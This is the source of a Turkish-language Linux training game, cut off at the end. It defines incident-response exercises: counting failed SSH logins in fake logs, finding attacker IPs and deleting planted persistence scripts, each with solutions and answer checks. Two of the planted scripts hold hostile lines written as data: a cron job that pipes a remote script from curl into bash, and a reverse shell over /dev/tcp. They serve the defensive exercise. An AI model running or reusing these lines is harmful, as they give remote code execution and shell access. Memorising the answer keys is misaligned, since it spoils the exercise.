'use strict';
/* Senaryo varyantlari: csi, script, sdwan, netops, git bolumleri.
   Ust seviye isimler VOP_ ve vop onekiyle, tum dosyalar ayni global scope'u paylasiyor.
   sdwan ve netops icin ext-net.js tek bir sabit dunya kurar. Burada kabuk basina bir dunya dosyasi
   (/var/lib/lab-net/vop-world) tutulur, sarmalanan network komutlari bu dosya varsa ciktilarini o dunyaya gore uretir,
   yoksa hicbir sey degismez ve temel gorevler oldugu gibi calisir. */

const VOP_H = '/home/burak';

/* ---------- ortak yardimcilar ---------- */

const vopRan = (ctx, re) => re.test(ctx.line);
const vopNorm = s => String(s).trim().toLowerCase().replace(/\s+/g, ' ');
const vopSub = (ctx, ...answers) => ctx.submit != null && answers.some(a => vopNorm(ctx.submit) === vopNorm(a));
const vopText = (sh, p) => { const n = sh.node(p); return n && n.t === 'f' ? n.d : null; };
const vopExists = (sh, p, t) => { const n = sh.node(p); return !!(n && (!t || n.t === t)); };
const vopCount = (text, re) => lines(text || '').filter(l => re.test(l)).length;

/* Dosya yerlestirir. Home altindaki ara dizinler burak'in olur, digerleri root'un */
function vopPut(sh, abs, content, mode, owner) {
  const parts = abs.split('/').filter(Boolean);
  let dir = sh.root;
  for (let i = 0; i < parts.length - 1; i++) {
    if (!dir.c[parts[i]]) dir.c[parts[i]] = mkdir({}, 0o755, abs.startsWith(VOP_H + '/') && i >= 2 ? 'burak' : 'root');
    dir = dir.c[parts[i]];
    if (!dir || dir.t !== 'd') return;
  }
  dir.c[parts[parts.length - 1]] = mkfile(content, mode === undefined ? 0o644 : mode, owner || 'root');
}
function vopDir(sh, abs, mode, owner) {
  const n = sh.node(abs);
  if (n && n.t === 'd') { n.m = mode; n.o = owner; return; }
  sh.install(abs, mkdir({}, mode, owner));
}
function vopRm(sh, abs) { const { dir, name } = sh.parent(abs); if (dir && dir.t === 'd' && dir.c[name]) delete dir.c[name]; }

/* ======================================================================
   CSI, olay yeri inceleme
   ====================================================================== */

const VOP_CSI = {
  /* Varyant 1, jump box'in rotate edilmis dunku log'lari */
  a: {
    auth: '/var/log/auth.log.1', access: '/var/log/nginx/access.log.1',
    authLog: [
      'Oct  9 00:58:02 linuxlab sshd[3088]: Accepted publickey for burak from 192.168.1.10 port 50122 ssh2',
      'Oct  9 00:58:02 linuxlab sshd[3088]: pam_unix(sshd:session): session opened for user burak',
      'Oct  9 01:02:11 linuxlab sshd[3101]: Failed password for invalid user admin from 198.51.100.77 port 40112 ssh2',
      'Oct  9 01:02:14 linuxlab sshd[3101]: Failed password for invalid user admin from 198.51.100.77 port 40118 ssh2',
      'Oct  9 01:02:18 linuxlab sshd[3104]: Failed password for root from 198.51.100.77 port 40120 ssh2',
      'Oct  9 01:10:40 linuxlab sshd[3120]: Failed password for invalid user admin from 203.0.113.12 port 51001 ssh2',
      'Oct  9 01:10:44 linuxlab sshd[3120]: Failed password for invalid user ubnt from 203.0.113.12 port 51007 ssh2',
      'Oct  9 01:15:02 linuxlab sudo:    burak : TTY=pts/0 ; PWD=/home/burak ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx',
      'Oct  9 01:21:09 linuxlab sshd[3133]: Failed password for invalid user admin from 198.51.100.77 port 40201 ssh2',
      'Oct  9 01:33:51 linuxlab sshd[3140]: Failed password for invalid user test from 192.0.2.150 port 60110 ssh2',
      'Oct  9 01:33:55 linuxlab sshd[3140]: Failed password for root from 192.0.2.150 port 60114 ssh2',
      'Oct  9 01:40:12 linuxlab sshd[3151]: Failed password for invalid user admin from 198.51.100.77 port 40233 ssh2',
      'Oct  9 02:05:30 linuxlab sshd[3170]: Failed password for jenkins from 203.0.113.12 port 51090 ssh2',
      'Oct  9 02:05:34 linuxlab sshd[3170]: Failed password for jenkins from 203.0.113.12 port 51094 ssh2',
      'Oct  9 02:05:51 linuxlab sshd[3172]: Accepted password for jenkins from 203.0.113.12 port 51102 ssh2',
      'Oct  9 02:05:52 linuxlab sshd[3172]: pam_unix(sshd:session): session opened for user jenkins',
      'Oct  9 02:07:13 linuxlab sudo:  jenkins : user NOT in sudoers ; TTY=pts/1 ; PWD=/var/lib/jenkins ; USER=root ; COMMAND=/bin/bash',
      'Oct  9 02:20:44 linuxlab sshd[3190]: Failed password for invalid user admin from 192.0.2.150 port 60200 ssh2',
      'Oct  9 02:41:03 linuxlab sshd[3201]: Failed password for invalid user oracle from 198.51.100.77 port 40301 ssh2',
      'Oct  9 02:41:07 linuxlab sshd[3201]: Failed password for root from 198.51.100.77 port 40305 ssh2',
      'Oct  9 03:12:19 linuxlab sshd[3230]: Failed password for invalid user admin from 203.0.113.12 port 51200 ssh2',
      'Oct  9 03:30:02 linuxlab sshd[3244]: Failed password for invalid user admin from 198.51.100.77 port 40390 ssh2',
      'Oct  9 03:30:06 linuxlab sshd[3244]: Failed password for invalid user ubnt from 198.51.100.77 port 40395 ssh2',
    ],
    accessLog: [
      '192.168.1.10 - - [09/Oct/2026:01:00:01 +0200] "GET / HTTP/1.1" 200 612',
      '198.51.100.77 - - [09/Oct/2026:01:30:01 +0200] "POST /api/login HTTP/1.1" 401 32',
      '198.51.100.77 - - [09/Oct/2026:01:30:03 +0200] "POST /api/login HTTP/1.1" 401 32',
      '198.51.100.77 - - [09/Oct/2026:01:30:05 +0200] "POST /api/login HTTP/1.1" 401 32',
      '192.168.1.22 - - [09/Oct/2026:01:31:40 +0200] "GET /api/status HTTP/1.1" 200 48',
      '198.51.100.77 - - [09/Oct/2026:01:32:10 +0200] "POST /api/login HTTP/1.1" 401 32',
      '198.51.100.77 - - [09/Oct/2026:01:32:44 +0200] "GET /.git/config HTTP/1.1" 404 153',
      '192.168.1.30 - - [09/Oct/2026:01:40:02 +0200] "GET /api/v2/export HTTP/1.1" 502 166',
      '198.51.100.77 - - [09/Oct/2026:01:41:19 +0200] "POST /api/login HTTP/1.1" 401 32',
      '192.168.1.22 - - [09/Oct/2026:01:45:00 +0200] "POST /api/login HTTP/1.1" 401 32',
      '192.168.1.22 - - [09/Oct/2026:01:45:06 +0200] "POST /api/login HTTP/1.1" 200 210',
      '192.168.1.30 - - [09/Oct/2026:01:46:31 +0200] "GET /api/v2/export HTTP/1.1" 502 166',
      '198.51.100.77 - - [09/Oct/2026:01:50:12 +0200] "POST /api/login HTTP/1.1" 401 32',
      '192.168.1.10 - - [09/Oct/2026:02:01:51 +0200] "GET /docs/ HTTP/1.1" 200 2048',
      '198.51.100.77 - - [09/Oct/2026:02:10:09 +0200] "GET /server-status HTTP/1.1" 403 199',
      '192.168.1.10 - - [09/Oct/2026:02:30:44 +0200] "GET / HTTP/1.1" 304 0',
    ],
    topIp: '198.51.100.77', topUser: 'admin', intruder: 'jenkins', code: 401, errCode: 502, errField: 7, errAnswer: '/api/v2/export',
    bdDir: '/var/tmp/.ICE-unix/.x', bdFile: '.kworker.sh', bdFind: '/var/tmp',
    bdBody: '#!/bin/bash\n# kworker, sistem sureci gibi gorunsun diye\n(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://198.51.100.77/k.sh | bash") | crontab -\n',
  },
  /* Varyant 2, rsyslog ile gelen web01 log'lari */
  b: {
    auth: '/var/log/remote/web01/auth.log', access: '/var/log/remote/web01/access.log',
    authLog: [
      'Oct 12 01:44:10 web01 sshd[811]: Accepted publickey for ops from 10.0.0.5 port 49822 ssh2',
      'Oct 12 01:44:10 web01 sshd[811]: pam_unix(sshd:session): session opened for user ops',
      'Oct 12 02:11:09 web01 sshd[902]: Failed password for ubuntu from 203.0.113.200 port 44120 ssh2',
      'Oct 12 02:11:13 web01 sshd[902]: Failed password for ubuntu from 203.0.113.200 port 44126 ssh2',
      'Oct 12 02:11:17 web01 sshd[905]: Failed password for root from 203.0.113.200 port 44131 ssh2',
      'Oct 12 02:19:40 web01 sshd[921]: Failed password for invalid user admin from 198.51.100.4 port 33010 ssh2',
      'Oct 12 02:25:02 web01 sshd[930]: Failed password for ubuntu from 203.0.113.200 port 44210 ssh2',
      'Oct 12 02:31:12 web01 sudo:      ops : TTY=pts/0 ; PWD=/home/ops ; USER=root ; COMMAND=/usr/bin/apt upgrade',
      'Oct 12 02:40:51 web01 sshd[944]: Failed password for postgres from 198.51.100.4 port 33044 ssh2',
      'Oct 12 02:52:33 web01 sshd[950]: Failed password for root from 192.0.2.33 port 58001 ssh2',
      'Oct 12 03:03:20 web01 sshd[961]: Failed password for ubuntu from 203.0.113.200 port 44302 ssh2',
      'Oct 12 03:15:45 web01 sshd[977]: Failed password for git from 198.51.100.4 port 33101 ssh2',
      'Oct 12 03:16:02 web01 sshd[979]: Accepted password for git from 198.51.100.4 port 33108 ssh2',
      'Oct 12 03:16:02 web01 sshd[979]: pam_unix(sshd:session): session opened for user git',
      'Oct 12 03:17:40 web01 sudo:      git : user NOT in sudoers ; TTY=pts/2 ; PWD=/srv/git ; USER=root ; COMMAND=/usr/bin/su -',
      'Oct 12 03:30:18 web01 sshd[990]: Failed password for invalid user admin from 192.0.2.33 port 58090 ssh2',
      'Oct 12 03:48:07 web01 sshd[1004]: Failed password for ubuntu from 203.0.113.200 port 44388 ssh2',
      'Oct 12 04:02:59 web01 sshd[1011]: Failed password for root from 198.51.100.4 port 33190 ssh2',
    ],
    accessLog: [
      '10.0.0.12 - - [12/Oct/2026:02:00:01 +0200] "GET / HTTP/1.1" 200 5120',
      '203.0.113.200 - - [12/Oct/2026:02:01:10 +0200] "GET /wp-login.php HTTP/1.1" 404 162',
      '203.0.113.200 - - [12/Oct/2026:02:01:11 +0200] "GET /xmlrpc.php HTTP/1.1" 404 162',
      '203.0.113.200 - - [12/Oct/2026:02:01:12 +0200] "GET /.env HTTP/1.1" 404 162',
      '10.0.0.12 - - [12/Oct/2026:02:03:40 +0200] "GET /static/app.js HTTP/1.1" 200 88310',
      '203.0.113.200 - - [12/Oct/2026:02:04:02 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 162',
      '10.0.0.45 - - [12/Oct/2026:02:05:30 +0200] "POST /api/orders HTTP/1.1" 500 91',
      '198.51.100.4 - - [12/Oct/2026:02:06:51 +0200] "GET /admin/ HTTP/1.1" 404 162',
      '203.0.113.200 - - [12/Oct/2026:02:07:15 +0200] "GET /config.json HTTP/1.1" 404 162',
      '10.0.0.12 - - [12/Oct/2026:02:08:00 +0200] "GET /favicon.ico HTTP/1.1" 404 162',
      '10.0.0.45 - - [12/Oct/2026:02:09:44 +0200] "POST /api/orders HTTP/1.1" 500 91',
      '10.0.0.30 - - [12/Oct/2026:02:10:00 +0200] "GET /health HTTP/1.1" 200 2',
      '203.0.113.200 - - [12/Oct/2026:02:12:31 +0200] "GET /backup.tar.gz HTTP/1.1" 404 162',
      '198.51.100.4 - - [12/Oct/2026:02:14:09 +0200] "GET /.git/HEAD HTTP/1.1" 404 162',
      '10.0.0.30 - - [12/Oct/2026:02:15:00 +0200] "GET /health HTTP/1.1" 200 2',
    ],
    topIp: '203.0.113.200', topUser: 'ubuntu', intruder: 'git', code: 404, errCode: 500, errField: 1, errAnswer: '10.0.0.45',
    bdDir: '/dev/shm/.x11', bdFile: '.sshd-helper.sh', bdFind: '/dev/shm',
    bdBody: '#!/bin/bash\n# sshd-helper, adi masum dursun\nwhile true; do bash -i >& /dev/tcp/203.0.113.200/4444 0>&1; sleep 300; done\n',
  },
};
function vopCsiSetup(v) {
  return sh => {
    vopPut(sh, v.auth, join(v.authLog), 0o644, 'root');
    vopPut(sh, v.access, join(v.accessLog), 0o644, 'root');
    if (v.bdFind === '/dev/shm') vopPut(sh, '/dev/shm/pulse-shm-2210841', 'pulse audio shared memory\n', 0o600, 'burak');
    if (v.bdFind === '/var/tmp') vopPut(sh, '/var/tmp/systemd-private-nginx/tmp/cache.db', 'nginx cache\n', 0o600, 'root');
  };
}
function vopCsiFailed(v) { return v.authLog.filter(l => l.includes('Failed password')).length; }
function vopCsiStatus(v, code) { return v.accessLog.filter(l => l.split(/\s+/)[8] === String(code)).length; }
function vopCsiBackdoor(v) {
  return sh => {
    vopCsiSetup(v)(sh);
    vopDir(sh, v.bdDir.slice(0, v.bdDir.lastIndexOf('/')), 0o1777, 'root');
    vopDir(sh, v.bdDir, 0o755, 'www-data');
    vopPut(sh, v.bdDir + '/' + v.bdFile, v.bdBody, 0o755, 'www-data');
  };
}

addVariants('c1', [
  { title: 'Rotate olmuş log',
    story: "Security ekibi dün gece jump box'a ssh brute force yapıldığından şüpheleniyor. Ama bu sabah logrotate çalıştı, güncel auth.log tertemiz görünüyor. Dünün kayıtları artık /var/log/auth.log.1 içinde. Rotate edilmiş dosyayı unutan analist saldırıyı hiç görmez.",
    task: "/var/log/auth.log.1 içinde kaç tane Failed password satırı var? Sayıyı submit et.",
    hint: "`grep -c` eşleşen satırları basmak yerine sadece sayısını verir. Aradığın ifade boşluk içerdiği için çift tırnak şart, yoksa shell onu iki argument yapar ve grep ikinci kelimeyi dosya adı sanar. Dikkat, güncel auth.log değil sonu .1 ile biten rotate edilmiş dosya lazım.",
    solution: 'ls /var/log\ngrep -c "Failed password" /var/log/auth.log.1\nsubmit ' + vopCsiFailed(VOP_CSI.a),
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, vopCsiFailed(VOP_CSI.a)) },
  { title: 'Merkezi syslog',
    story: "web01 nginx sunucusu log'larını rsyslog ile bu makineye yolluyor, hepsi /var/log/remote/web01 altında birikiyor. web01 ekibi gece sshd'nin çok meşgul olduğunu, CPU'nun tavan yaptığını söylüyor. İlk iş kaba bir rakam, kaç başarısız deneme var.",
    task: "/var/log/remote/web01/auth.log içindeki Failed password denemelerinin sayısını submit et.",
    hint: "`grep -c` eşleşen satır sayısını döner, satırları tek tek saymana gerek kalmaz. Desen boşluk içerdiği için tırnak içinde vermelisin. Remote log'lar da düz text dosyasıdır, path'i doğru verdiğin sürece aynı araçlar çalışır.",
    solution: 'ls /var/log/remote/web01\ngrep -c "Failed password" /var/log/remote/web01/auth.log\nsubmit ' + vopCsiFailed(VOP_CSI.b),
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, vopCsiFailed(VOP_CSI.b)) },
], { hint: "`grep -c` eşleşen satırları ekrana basmak yerine sadece kaç tane olduğunu söyler. Aradığın ifade iki kelime olduğu için çift tırnak içine almalısın, yoksa grep ikinci kelimeyi dosya adı sanar. Büyük küçük harf önemli, log'da Failed büyük F ile yazıyor." });

addVariants('c2', [
  { title: 'Dünün baş şüphelisi',
    story: "Dünkü brute force'un kaynağını bulup edge firewall'da block'layacağız. Birden fazla IP var, sen en ısrarcı olanı bul. Kayıtlar yine rotate edilmiş /var/log/auth.log.1 içinde.",
    task: "auth.log.1 içinde en çok Failed password üreten IP adresini submit et.",
    hint: "Önce `grep` ile sadece Failed password satırlarını süz. Bu satırlarda IP sondan dördüncü kelime, `awk` içinde `$(NF-3)` onu verir çünkü NF son alanın numarasıdır. Sonra `sort` aynı IP'leri yan yana getirir, `uniq -c` sayar, `sort -rn` en büyüğü en üste koyar. sort atlanırsa uniq sadece ardışık tekrarları birleştirir ve sayılar yanlış çıkar.",
    solution: "grep \"Failed password\" /var/log/auth.log.1 | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -1\nsubmit " + VOP_CSI.a.topIp,
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, VOP_CSI.a.topIp) },
  { title: 'web01 saldırganı',
    story: "web01 için cloud firewall'da bir deny rule yazılacak, ama yanlış IP'yi block'larsak meşru bir müşteri kesilir. rsyslog ile gelen auth log'undan en çok deneme yapan adresi kesin olarak çıkar.",
    task: "/var/log/remote/web01/auth.log içinde en çok başarısız deneme yapan IP'yi submit et.",
    hint: "Satırın sonu hep aynı kalıpta, from IP port N ssh2. Bu yüzden IP sondan dördüncü alan ve `awk` ile `$(NF-3)` olarak alınır. Çıkan listeyi `sort` ile sırala, `uniq -c` ile say, `sort -rn` ile büyükten küçüğe diz. invalid user satırları daha uzun ama sondan sayınca fark etmez, bu yüzden NF kullanmak $11 gibi sabit numaradan daha güvenli.",
    solution: "grep \"Failed password\" /var/log/remote/web01/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -1\nsubmit " + VOP_CSI.b.topIp,
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, VOP_CSI.b.topIp) },
], { hint: "Önce `grep` ile sadece Failed password satırlarını süz. IP her satırda sondan dördüncü alan, `awk` içinde `$(NF-3)` bunu verir. Ardından `sort`, `uniq -c` ve `sort -rn` zinciri her IP'yi sayıp en çoğu en üste koyar. sort olmadan uniq yalnızca yan yana duran tekrarları sayar, sonuç yanlış olur." });

addVariants('c3', [
  { title: 'Hedefteki hesap',
    story: "Dünkü saldırıda bot'lar hangi kullanıcı adını zorlamış? Bu bilgi SSH hardening için önemli, o hesap varsa kapatacağız, yoksa fail2ban kuralını ona göre yazacağız.",
    task: "auth.log.1 içinde en çok denenen username'i submit et.",
    hint: "Username her iki kalıpta da from kelimesinden hemen önce duruyor, for root from ya da invalid user admin from. Sondan sayınca bu alan `$(NF-5)`, `awk` ile çek. Sonra `sort`, `uniq -c` ve `sort -rn` ile say. Sadece root'u `grep -c` ile saymak yanıltır, çünkü invalid user satırlarını gözden kaçırırsın.",
    solution: "grep \"Failed password\" /var/log/auth.log.1 | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn\nsubmit " + VOP_CSI.a.topUser,
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, VOP_CSI.a.topUser) },
  { title: 'Cloud image hesabı',
    story: "web01 bir cloud image'dan kurulmuş, bu image'ların bilinen default hesapları vardır. Saldırgan da bunu biliyor olabilir. Hangi username'in en çok denendiğini bul, sonucu image hardening checklist'ine ekleyeceğiz.",
    task: "/var/log/remote/web01/auth.log içinde en çok hedef alınan username'i submit et.",
    hint: "Failed password satırlarında username, from kelimesinin hemen solunda. Sondan sayarsan `$(NF-5)` olur, `awk` bu alanı her satırdan çeker. `sort` ve `uniq -c` ile say, `sort -rn` ile büyükten küçüğe diz. Sabit alan numarası kullanma, invalid user satırları iki kelime daha uzun.",
    solution: "grep \"Failed password\" /var/log/remote/web01/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -rn\nsubmit " + VOP_CSI.b.topUser,
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, VOP_CSI.b.topUser) },
], { hint: "Username from kelimesinin hemen solunda, sondan sayınca `$(NF-5)`. `awk` ile bu alanı çek, `sort`, `uniq -c` ve `sort -rn` ile say. Sadece `grep -c \"for root\"` yazmak eksik kalır, invalid user satırlarındaki hesapları kaçırırsın." });

addVariants('c4', [
  { title: 'CI hesabı içeride',
    story: "Daha kötü bir bulgu var. Bir hesap önce birkaç kez fail olmuş, sonra başarılı login yapmış ve hemen root shell açmaya çalışmış. Bu artık deneme değil, ihlal. Hesabı hemen kilitleyeceğiz.",
    task: "auth.log.1 içinde fail sonrası içeri girip sudo ile root olmaya çalışan kullanıcının adını submit et.",
    hint: "`grep -E` extended regex açar, böylece iki kelimeyi pipe işaretiyle tek seferde arayabilirsin, Accepted ve sudo. Accepted satırları kimin girdiğini, sudo satırları kimin yetki istediğini gösterir. NOT in sudoers yazan satır şüphelini ele verir, sonra o kullanıcıyı ayrıca grep'leyip önceki Failed denemelerini teyit et.",
    solution: 'grep -E "Accepted|sudo" /var/log/auth.log.1\ngrep ' + VOP_CSI.a.intruder + ' /var/log/auth.log.1\nsubmit ' + VOP_CSI.a.intruder,
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, VOP_CSI.a.intruder) },
  { title: 'Repo hesabı',
    story: "web01'de aynı hikaye, ama başka bir hesapla. Biri birkaç başarısız denemeden sonra içeri girmiş ve root olmak için su denemiş. Hesap sahibi bir servis olabilir, şifresi zayıf bırakılmış.",
    task: "web01 auth.log içinde fail, sonra Accepted, sonra sudo denemesi yapan kullanıcıyı submit et.",
    hint: "`grep -E` ile Accepted ve sudo kelimelerini aynı anda ara, pipe işareti extended regex'te veya demek. Meşru admin de sudo kullanır, fark NOT in sudoers ifadesinde. Bulduğun hesabı tek başına grep'leyip aynı IP'den önce Failed password gelip gelmediğine bak.",
    solution: 'grep -E "Accepted|sudo" /var/log/remote/web01/auth.log\ngrep ' + VOP_CSI.b.intruder + ' /var/log/remote/web01/auth.log\nsubmit ' + VOP_CSI.b.intruder,
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, VOP_CSI.b.intruder) },
], { hint: "`grep -E` extended regex açar ve pipe işaretiyle iki kelimeyi tek seferde aramanı sağlar, Accepted ile sudo. Accepted kimin girdiğini, sudo satırları kimin root istediğini gösterir. NOT in sudoers yazan kullanıcı şüphelin, aynı ismi ayrıca grep'leyip önceki Failed denemelerini teyit et." });

addVariants('c5', [
  { title: 'Login brute force',
    story: "Aynı saldırgan sadece ssh değil, web uygulamasının login API'sini de zorlamış. nginx log'u da rotate edilmiş, /var/log/nginx/access.log.1 içinde. Combined log formatında 9. alan HTTP status code.",
    task: "access.log.1 içinde kaç tane 401 Unauthorized response var? submit et.",
    hint: "`awk '{print $9}'` her satırdan sadece status code alanını çıkarır, nginx combined formatında boşluğa göre 9. alan odur. Sonra `sort` ve `uniq -c` her kodun kaç kez geçtiğini gösterir. `grep 401` kullanma, boyut ya da port gibi başka alanlarda da 401 geçebilir ve sayı şişer.",
    solution: "awk '{print $9}' " + VOP_CSI.a.access + ' | sort | uniq -c\nsubmit ' + vopCsiStatus(VOP_CSI.a, 401),
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, vopCsiStatus(VOP_CSI.a, 401)) },
  { title: 'Tarayıcı izi',
    story: "web01'e gece bir vulnerability scanner girmiş gibi, wp-login, .env, backup dosyaları aranmış. Var olmayan path'ler 404 döner. Ne kadar tarandığını görmek için 404 sayısı iyi bir ölçü.",
    task: "/var/log/remote/web01/access.log içinde kaç 404 response var? submit et.",
    hint: "nginx combined log'unda status code 9. alandır, `awk` ile `$9` olarak çekilir. `sort` ile sıralayıp `uniq -c` ile saymak her kodun dağılımını tek bakışta verir. Düz `grep 404` path ya da byte alanında da eşleşebilir, alan bazlı saymak daha güvenli.",
    solution: "awk '{print $9}' " + VOP_CSI.b.access + ' | sort | uniq -c\nsubmit ' + vopCsiStatus(VOP_CSI.b, 404),
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, vopCsiStatus(VOP_CSI.b, 404)) },
], { hint: "`awk '{print $9}'` her satırdan sadece status code alanını çıkarır, combined log formatında 9. alan odur. `sort` ile sıralayıp `uniq -c` ile saymak her kodun kaç kez geçtiğini verir. `grep 404` yazmak riskli, byte sayısı gibi başka alanlarda da aynı rakam geçebilir." });

addVariants('c6', [
  { title: 'Upstream düştü',
    story: "502 Bad Gateway, nginx'in arkasındaki uygulamaya ulaşamadığı anlamına gelir. Sorun client'ta değil, upstream'de. Dün gece bir endpoint sürekli 502 vermiş, developer ekibi hangisi olduğunu soruyor.",
    task: "access.log.1 içinde 502 dönen request'lerin path'ini submit et.",
    hint: "`awk` bir koşul ve bir action alabilir, koşul `$9 == 502` sadece o satırları seçer, action ise istediğin alanı basar. Request path combined formatta 7. alandır, 1. alan client IP. Sonuçta aynı path tekrar edeceği için `sort -u` ile tekilleştir.",
    solution: "awk '$9 == 502 {print $7}' " + VOP_CSI.a.access + ' | sort -u\nsubmit ' + VOP_CSI.a.errAnswer,
    setup: vopCsiSetup(VOP_CSI.a),
    check: (sh, c) => vopSub(c, VOP_CSI.a.errAnswer, VOP_CSI.a.errAnswer.slice(1)) },
  { title: 'Sipariş hatası',
    story: "web01'de 500 Internal Server Error'lar var. 500 uygulamanın kendi hatasıdır, ama hep aynı client'tan geliyorsa o client'ın gönderdiği veri hatayı tetikliyor olabilir. Developer'lar client IP'sini istiyor ki o istekleri tekrar üretebilsinler.",
    task: "web01 access.log içinde 500 dönen request'lerin client IP adresini submit et.",
    hint: "`awk` içinde `$9 == 500` koşulu sadece 500 dönen satırları seçer, ardından gelen print action'ı istediğin alanı basar. Client IP her satırın 1. alanı. Aynı IP birden fazla kez çıkacağı için `sort -u` ile tek satıra indir.",
    solution: "awk '$9 == 500 {print $1}' " + VOP_CSI.b.access + ' | sort -u\nsubmit ' + VOP_CSI.b.errAnswer,
    setup: vopCsiSetup(VOP_CSI.b),
    check: (sh, c) => vopSub(c, VOP_CSI.b.errAnswer) },
], { hint: "`awk` koşul ve action birlikte alır. `$9 == 500` sadece status code'u 500 olan satırları seçer, ardından print ile 1. alanı yani client IP'yi basarsın. Aynı IP birden çok kez çıkar, `sort -u` ile tekilleştir." });

addVariants('c7', [
  { title: 'Persistence script',
    story: "jenkins hesabı içerideyken bir şey bırakmış olabilir. /tmp her reboot'ta temizlendiği için akıllı saldırganlar /var/tmp kullanır, orası reboot'tan sağ çıkar. X11 socket dizini gibi masum görünen hidden directory'lere dikkat.",
    task: "/var/tmp altındaki .sh dosyasını bul, içini oku, sonra sil.",
    hint: "`find` verdiğin dizinden başlayıp alt dizinleri de gezer, `-name` ile glob deseni verirsin. Deseni tırnak içine al, yoksa shell yıldızı kendi bulunduğun dizinde açar. Dosyanın bulunduğu dizin www-data'ya ait ve sana yazma izni vermiyor, bu yüzden silmek için `sudo` gerekecek.",
    solution: 'find /var/tmp -name "*.sh"\ncat /var/tmp/.ICE-unix/.x/.kworker.sh\nsudo rm /var/tmp/.ICE-unix/.x/.kworker.sh',
    setup: vopCsiBackdoor(VOP_CSI.a),
    check: sh => !vopExists(sh, '/var/tmp/.ICE-unix/.x/.kworker.sh') },
  { title: 'RAM diskteki iz',
    story: "Merkezi syslog sunucusu olan bu makineye de bakmak lazım. /dev/shm bir tmpfs, yani RAM üzerinde yaşar, diske iz bırakmaz ve herkes yazabilir. Saldırganların sevdiği bir saklanma yeri.",
    task: "/dev/shm altındaki .sh dosyasını bul, içeriğini oku ve sil.",
    hint: "`find` ile `-name` kullan ve glob desenini tırnakla koru, yoksa shell onu erkenden açar. find hidden directory'leri de gezer, ls'teki gibi -a vermene gerek yok. Script www-data'nın dizininde, silme izni dizin sahibine ait olduğundan `sudo` ile silmelisin.",
    solution: 'find /dev/shm -name "*.sh"\ncat /dev/shm/.x11/.sshd-helper.sh\nsudo rm /dev/shm/.x11/.sshd-helper.sh',
    setup: vopCsiBackdoor(VOP_CSI.b),
    check: sh => !vopExists(sh, '/dev/shm/.x11/.sshd-helper.sh') },
], { hint: "`find` verdiğin dizinden başlayıp hidden olanlar dahil tüm alt dizinleri gezer, `-name` glob deseni alır. Deseni tırnak içine al ki shell yıldızı erkenden açmasın. Dosya başka bir kullanıcının dizininde olduğunda silme izni dizinin yazma hakkına bağlıdır, bu yüzden `sudo` gerekebilir." });

/* ======================================================================
   Script ustasi
   ====================================================================== */

addVariants('s1', [
  { title: 'Hub değişkeni',
    story: "Tunnel script'lerinde hub adını her yere elle yazmak yerine bir variable'da tutacaksın. Bash'te atama yaparken eşittir işaretinin iki yanında boşluk olmaz.",
    task: "HUB variable'ına ams-dc-hub01 ata ve echo ile Tunnel hedefi ams-dc-hub01 yazdır.",
    hint: "Atama `ISIM=deger` şeklinde ve boşluksuz yazılır. Boşluk bırakırsan bash HUB kelimesini komut sanar ve command not found der. Değeri okurken başına dolar işareti koyarsın, echo argümanını çift tırnak içine alırsan variable yine expand olur.",
    solution: 'HUB=ams-dc-hub01\necho "Tunnel hedefi $HUB"',
    check: (sh, c) => sh.env.HUB === 'ams-dc-hub01' && c.out.includes('Tunnel hedefi ams-dc-hub01') },
  { title: 'Site kodu',
    story: "Ticket notlarında site kodunu sürekli tekrar yazıyorsun. Bir variable'a koy, sonra her yerde onu kullan.",
    task: "SITE variable'ına IST-BR-07 ata ve echo ile Site kodu IST-BR-07 yazdır.",
    hint: "`SITE=IST-BR-07` gibi boşluksuz bir atama yap, eşittirin yanına boşluk koyarsan bash SITE'ı komut olarak çalıştırmaya kalkar. echo içinde `$SITE` yazınca shell onu değeriyle değiştirir. Değerdeki tire işareti sorun değil, boşluk olsaydı tırnak gerekirdi.",
    solution: 'SITE=IST-BR-07\necho "Site kodu $SITE"',
    check: (sh, c) => sh.env.SITE === 'IST-BR-07' && c.out.includes('Site kodu IST-BR-07') },
], { hint: "Bash'te atama `ISIM=deger` şeklinde ve eşittirin iki yanında boşluk olmadan yapılır, boşluk koyarsan bash ismi komut sanar. Değeri kullanırken başına dolar işareti koyarsın. echo argümanını çift tırnak içine almak boşluklu metni tek parça tutar ve variable yine expand olur." });

addVariants('s2', [
  { title: 'Dokümandaki PATH',
    story: "Runbook'a bir örnek satır yazıyorsun, okuyan kişi ekranda gerçekten $PATH ifadesini görmeli, senin PATH değerini değil. Tek tırnak içinde shell hiçbir şeyi expand etmez.",
    task: "echo ile ekrana tam olarak $PATH yazdır, değeri değil ifadenin kendisi görünsün.",
    hint: "Tek tırnak içindeki her karakter olduğu gibi kalır, dolar işareti de dahil. Çift tırnak ise variable'ları açar, o zaman ekranda uzun bir dizin listesi görürsün. Alternatif olarak dolar işaretini ters bölü ile escape edebilirsin ama tek tırnak en okunaklısı.",
    solution: "echo '$PATH'",
    check: (sh, c) => c.out.trim() === '$PATH' },
  { title: 'Crontab satırı',
    story: "Bir arkadaşına crontab'a ekleyeceği satırı ekrandan kopyalatacaksın. Satırdaki $HOME ve && olduğu gibi kalmalı, yoksa senin shell'in onları yorumlar.",
    task: "echo ile ekrana tam olarak cd $HOME && ./backup.sh yazdır.",
